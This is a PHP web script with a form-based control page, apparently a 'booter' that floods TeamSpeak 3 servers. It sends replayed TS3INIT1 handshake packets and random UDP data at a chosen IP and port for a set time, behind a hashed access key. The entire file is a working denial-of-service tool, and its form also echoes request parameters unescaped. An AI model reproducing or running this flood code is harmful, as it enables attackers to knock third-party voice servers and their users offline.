<?php
set_time_limit(3600);
ignore_user_abort(TRUE);
error_reporting(1);

function generateRandomString($length) 
{
    return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $length);
}
// generateRandomString(10);

if((isset($_GET['ip']))&&(isset($_GET['port']))&&(isset($_GET['time']))&&(sha1($_GET['key']) === '40bd001563085fc35165329ea1ff5c5ecbdbbeef'))
{
    $packets = 0;
    $exec_time = $_GET['time'];
	$method = $_GET['method'];
    
    $time = time();
    //print "Started: ".time('d-m-y h:i:s')."<br>";
    $max_time = $time+$exec_time;
    $host = $_GET['ip'];
	//$threads = $_GET['threads'];
	$port = $_GET['port'];
	
			
    $fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
	$pps = 0;	
	//parameters
    $init = 0;
	//end
    while(1)
	{
		//$packets++;
            if(time() > $max_time)
				{
					break;
				}
				
		$pps++;	
				if ($init == 0)
				{
					//INIT
					fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
					fwrite($fp, "\xba\x2a\xc3\x4a\xc4\xd9\x84\xfc\x00\x00\x00\x00\x22\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x6d\x64\xf1\x95\xd3\xd2\x1e\x79\xd2\xe4\xca\x03\x2f\x69\xfc\x95\x3e\x71\x02\x9f\x29\x1a\x2d\xc2\x46\xf2\x15\xf4\xf1\x6b\xe7\x7e\xd0\x6a\x70\x99\xaa\x46\xa6\x4c\x77\x80\x39\x7a\x11\x16\xce\x96\x3e\xd7\x73\xa5\xfd\x07\x87\xed\x21\xbc\xc3\x61\x0a\x92\xaf\x7c\x7d\x47\x54\x9f\x00\x22\xce\xf6\x13\x27\xde\xda\x7b\xe2\x5a\x88\x9b\xed\x2d\xd6\x0f\xad\x7f\x5b\x6b\x2d\x97\xa0\xc1\x1d\x0b\x44\x2b\x02\xb7\x19\xa8\xd1\xeb\x26\xf2\xba\x49\xa1\xd9\xd0\x03\x3b\xbe\x2e\x2f\xfa\xf6\x23\x0a\xed\x89\xba\x93\x8c\xae\x8b\x0c\x56\xfe\x83\xf1\x25\xc3\x11\x84\x18\x90\xf5\xe4\xe7\x47\x3e\xa4\x31\x9a\x28\x68\x5c\x93\x91\x85");
					fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
					fwrite($fp, "\xba\x2a\xc3\x4a\xc4\xd9\x84\xfc\x00\x00\x00\x00\x22\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x6d\x64\xf1\x95\xd3\xd2\x1e\x79\xd2\xe4\xca\x03\x2f\x69\xfc\x95\x3e\x71\x02\x9f\x29\x1a\x2d\xc2\x46\xf2\x15\xf4\xf1\x6b\xe7\x7e\xd0\x6a\x70\x99\xaa\x46\xa6\x4c\x77\x80\x39\x7a\x11\x16\xce\x96\x3e\xd7\x73\xa5\xfd\x07\x87\xed\x21\xbc\xc3\x61\x0a\x92\xaf\x7c\x7d\x47\x54\x9f\x00\x22\xce\xf6\x13\x27\xde\xda\x7b\xe2\x5a\x88\x9b\xed\x2d\xd6\x0f\xad\x7f\x5b\x6b\x2d\x97\xa0\xc1\x1d\x0b\x44\x2b\x02\xb7\x19\xa8\xd1\xeb\x26\xf2\xba\x49\xa1\xd9\xd0\x03\x3b\xbe\x2e\x2f\xfa\xf6\x23\x0a\xed\x89\xba\x93\x8c\xae\x8b\x0c\x56\xfe\x83\xf1\x25\xc3\x11\x84\x18\x90\xf5\xe4\xe7\x47\x3e\xa4\x31\x9a\x28\x68\x5c\x93\x91\x85");
					//NEG
					fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x02\x7f\x94\xd4\xa5\x19\x15\x04\x90\xd8\x71\x04\x65\x7d\x3a\x9a\x09\xb8\xbc\x90\xf3");
					fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x04\x48\xb5\x88\xe0\xc4\xf9\x39\x99\x66\xf3\xd8\x27\x72\xb9\xe5\x29\x85\xf5\xa1\x14\xef\x22\x43\x04\xb2\x8e\x33\xdf\x1b\x0d\x72\x48\xcd\x25\x37\xc1\xc9\x21\xa3\x2d\x0e\x3a\xa9\xfa\xda\x2c\xe4\x92\x6b\x45\xce\x9f\x98\xcb\x6b\x2c\xac\x71\x17\x02\x40\x06\x06\xe6\xcd\x1d\x15\xe3\xa1\x16\x37\x66\x52\xba\x3a\x10\x11\xd0\x5e\x5b\xef\x5e\x90\x17\x50\x1e\x58\xec\x84\xae\x60\x51\xdd\x57\x96\xcf\xa0\x0e\x4c\x43\xf8\x0f\x22\xf7\xdf\x1e\x3e\x58\xa4\xc8\x94\x90\x86\xd3\x06\x1c\x4d\x90\xbd\xd8\x00\x5c\x80\xa6\xe3\x0b\xd3\xcd\x00\x00\x27\x10\x11\x53\xab\x11\xc2\x52\x6f\x50\x8f\xf1\x0d\x0a\xcb\x3a\x14\xf6\x1f\x1b\x24\x86\xf5\xd0\xbf\x7c\xe3\x36\x63\x2c\xe7\x37\xd9\x5a\x77\x7f\x85\x43\x01\x35\xc5\xdb\xae\xb7\xcb\xf7\x21\x4d\x84\xf7\xbc\xa3\x8c\x64\x9d\xa2\x41\x66\x4c\xfc\x53\x9e\x04\x45\xeb\x81\xdc\xeb\x12\xa2\x36\x9a\xb9\x75\xd6\x40\x6b\x7b\xed\x1c\x16\xa3\x17\xf4\xcf\xc0\x80\x87\x14\xe1\x77\x9e\x29\x2d\x55\x29\xa1\xbc\x45\x85\x3f\x79\x62\x0f\xcd\xef\x04\x44\xe7\xe7\x0a\xa9\xaa\x48\xa9\xbd\x97\x28\xfb\x12\xc6\x7c\x6d\x9c\xd4\x2a\x40\xef\x1b\x38\xfb\x59\xcd\x8d\xcc\xb5\x44\x3c\xee\xed\x7e\x49\x8d\x08\xcc\x7d\x00\xa1\x47\xbb\x45\x5f\x41\x1c\x8e\x43\xb7\x5e\x80\xdc\x8a\x30\xf5\xa2\xa9\xe5\x63\x6c\x69\x65\x6e\x74\x69\x6e\x69\x74\x69\x76\x20\x61\x6c\x70\x68\x61\x3d\x37\x58\x43\x35\x77\x6c\x7a\x72\x62\x5c\x2f\x79\x58\x61\x51\x3d\x3d\x20\x6f\x6d\x65\x67\x61\x3d\x4d\x45\x30\x44\x41\x67\x63\x41\x41\x67\x45\x67\x41\x69\x45\x41\x75\x6d\x6c\x61\x45\x65\x46\x45\x68\x58\x76\x38\x62\x58\x76\x78\x48\x54\x35\x56\x46\x36\x61\x34\x38\x65\x6b\x45\x41\x36\x4f\x58\x70\x79\x38\x66\x67\x43\x55\x74\x30\x63\x6b\x43\x49\x51\x44\x68\x30\x53\x4b\x4a\x34\x6c\x48\x36\x44\x57\x61\x53\x75\x77\x6e\x48\x34\x4b\x57\x35\x50\x5c\x2f\x44\x6e\x6e\x34\x34\x54\x62\x56\x70\x4a\x69\x36\x65\x55\x68\x45\x61\x35\x45\x51\x3d\x3d\x20\x69\x70\x3d" . $host);
					fwrite($fp, "\x9e\x0e\x07\x6b\x5c\xd0\x05\xb7\x00\x01\x00\x00\x32\xc2\x6b\x60\x0c\xb0\x4d\x8a\x9a\x2d\x8b\x83\x9e\x68\xa3\x03\xb6\x68\xb5\xe4\x35\x5a\x54\x61\x14\x3b\xd0\x65\x3d\x00\x14\xb5\xa3\x1c\x22\x6c\x60\x87\xd6\x21\xbc\x82\xb9\x61\xe6\x2f\xa9\x7b\x44\xfa\x8f\x76\x04\xf2\x2c\x06\x3f\x28\x6e\xeb\xff\x2c\x7f\xdf\x0d\xc5\x3b\xfc\x1f\xaa\xa7\xd9\x48\xa5\x57\xe1\x59\x67\x20\x49\x9a\x06\x31\x01\x45\x5e\x79\x25\x66\xfa\x13\xe7\xc8\x84\xf7\x7e\xd8\xd2\xc9\xc1\x4f\x58\x3d\x4e\xd3\x76\x66\x41\xcc\x9b\xa2\x14\x36\xc4\x3f\xb7\x92\xbb\xbc\x1a\x57\xd9\xc6\x35\xeb\x66\x86\xa7\xaa\x6b\x92\x70\xb9\x8c\x84\x86\xb9\xdd\x9f\xa4\x71\xdd\xc6\xe8\x8f\xb2\x78\x17\xeb\x0a\x21\xa0\x5c\xa7\xfc\x91\x7d\x08\x62\x66\xfb\x53\x40\xd2\xcc\x46\xfc\xea\x53\xcc\x6d\xb2\x01\xd4\x9c\x3c\x36\x47\x37\x1b\xe5\xc2\x40\x91\x0b\xe7\xd2\xc2\x2a\xad\x14\xc3\xfa\xb9\x27\x3e\x32\x40\x12\x00\x4c\xb4\xd1\x1a\xa0\xb4\xe8\xe4\x41\x08\x99\x26\x68\x61\x86\xa3\xb9\x82\x2c\xf3\x51\x1d\xa8\x12\x5e\x38\x8f\x34\x87\xd7\xec\x2d\xa9\xc3\xb4\x3e\x9d\x4b\x71\x26\xe8\x7f\x33\xb6\xeb\xf4\x8e\x69\x72\x01\x32\x21\x21\xed\x0e\x53\x5f\x23\x9e\x26\x4c\x80\x25\x7e\x3b\x47\x86\xc9\xaf\x38\x8b\x1f\x67\xcd\x44\x17\x48\x74\x98\xe7\xe8\xdc\x55\xc1\x66\x66\x98\xea\x4a\x5c\xfa\xb7\x68\x79\x3b\x3d\x92\xdb\xfb\xd2\xf6\xc6\x29\x7e\x27\x84\x61\x6e\x64\xc9\x98\xda\x16\x25\x17\x66\x43\xe8\xd3\x58\xba\xf0\x4e\xa2\x69\x5f\xb8\x4d\x91\xfa\xbe\xc8\x3e\xd2\x16\x64\x2d\x06\xdb\x19\xfa\x31\x3c\xca\x30\xbd\x40\x59\xc4\x70\x89\xf8\xbc\x12\x34\x86\xbb\x7a\xe9\xb5\xa5\xc1\xa9\xc4\x3f\x6a\x88\x41\xa9\xed\x36\xd2\x95\xcd\x8e\x51\xc0\xbd\xb0\x27\x80\xe6\xb2\xa8\xd9\x50\x08\x3f\xc1\xb4\x90\x7d\x21\x58\x90\xe4\x5a\xae\xc8\x0c\x81\x60\x36\xdb\xe2\x0a\x90\x77\xa1\x27\x3e\xd8\xea\x90\x68\x5d\x98\x61\x05\x3a\x71\x09\x64\xed\x1e\xc7\xb5\x96\x13\x24\xd1\x01\x57\x9c\x66\x4f\x9f\xcc\x42\x77\xd0\xa3\xdd\x0e\xcc\x21\x8d\x17\xf6\x1d\x9f\xb2\xd3\xea\x20\x12\x25\x9d\x9e\xa7\x9d\x82\x28\x1d\x40\xc2\x11\x79\xe2\x2e\xaf\x1b\xae\x42\x38\xd2\xee\x45\xb4\x37\x76\xb1\x44\xe4\xfd\xfc\xfa\x00");
					fwrite($fp, "\xa1\x72\x0e\xe8\xcb\x4d\xe9\x37\x00\x02\x00\x00\x32\x88\x34\xd5\x70\xf4\x38\xef\xff\x05\x91\x76\xb4\x20\x07\xd2\x58\x4d\xd3\xc7\xf3\x0a\x37\xc0\x46\xf5\x50\xaf\xc7\x2c\xac\x54\xb8\x4a");
					$init = 1;
				}
				
					if ($method = 'NORMAL')
					{
						fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
					}
					if ($method = 'HARD')
					{
						fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00". generateRandomString(15));
					}
					if ($method = 'HARDSTYLE')
					{
						fwrite($fp, generateRandomString(34));
					}
					if ($method = 'EPIC')
					{
						fwrite($fp, generateRandomString(15));
						fwrite($fp, generateRandomString(13)); 
					}
					if ($method = 'MIXED')
					{
						fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
						fwrite($fp, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00". generateRandomString(15));
						fwrite($fp, generateRandomString(15));
						fwrite($fp, generateRandomString(13)); 
						fwrite($fp, generateRandomString(34));
					}
					
			
					

			//$resp = fread($fp, 1024);	
    }
	fclose($fp);
	
}  
	
?>

<head>
<title>[TS3] Fuck!</title>
<meta charset="utf-8">
<link rel="shortcut icon" href="">
<style>
body {
    margin:0;
    padding:0;
    background-color: #000;
    color:#1589FF;
    font-family: Tahoma;
	font-size: 16px;
}
input, button, select{
    background-color: #1589FF;
    padding:2px;
    margin-top:3px; color:#fff;
    font-family: Tahoma;
    border: 1px solid #555;
    font-size: 16px;
    text-align: center;
    font-style: bold;
    border-radius: 4px;
}
#fff{
    margin-top: 20px;
    cursor:pointer;
}
#funn{
    font-size: 15px;
}
</style>
</head>

<body>
<center>
<br>
<br>
<h3>[TS3] Fuck!</h3>
<div>
<form action="?" method="get">
	<table>  
  <tr><td><input type="text" name="ip" style="width:200px;" value="<?php if (isset($_GET['ip'])) {echo $_GET['ip'];} else {echo '127.0.0.1';} ?>" placeholder="IP"/></td></tr>
  <tr><td><input type="text" name="port" style="width:200px;" value="<?php if (isset($_GET['port'])) {echo $_GET['port'];} else {echo '9987';} ?>" placeholder="Port"/></td></tr>
  <tr><td><input type="text" name="time" style="width:200px;" value="<?php if (isset($_GET['time'])) {echo $_GET['time'];} else {echo '60';} ?>" placeholder="Time"/></td></tr>
  <tr><td><input type="text" name="key" style="width:200px;" value="<?php if (isset($_GET['key'])) {echo $_GET['key'];} ?>" placeholder="key123"/></td></tr>
  
	<tr><td>
	<select name="method" style="width:200px;">
	<optgroup label="Premium">
	<option value="NORMAL">NORMAL</option>
	<option value="HARD">HARD</option>
	<option value="HARDSTYLE">HARDSTYLE</option>
	<option value="EPIC">EPIC</option>
	<option value="MIXED">MIXED</option>
	</optgroup>
	</select>
	</td></tr>
  
  <tr><td><input type="submit" id="fff" style="width:200px;" value="    Send    "/></td></tr>
	</table>
</form>
<br><br>
</div>
</center>
</body>